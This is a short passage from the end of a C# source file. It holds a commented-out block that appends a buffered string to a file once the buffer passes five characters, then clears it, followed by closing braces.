        //                if (buffer.Length > 5)
        //                { 
        //                    File.AppendAllText(fileName, buffer);
        //                    buffer = "";
        //                }
        //            }

        //        }
        //    }
        //}
    }
}
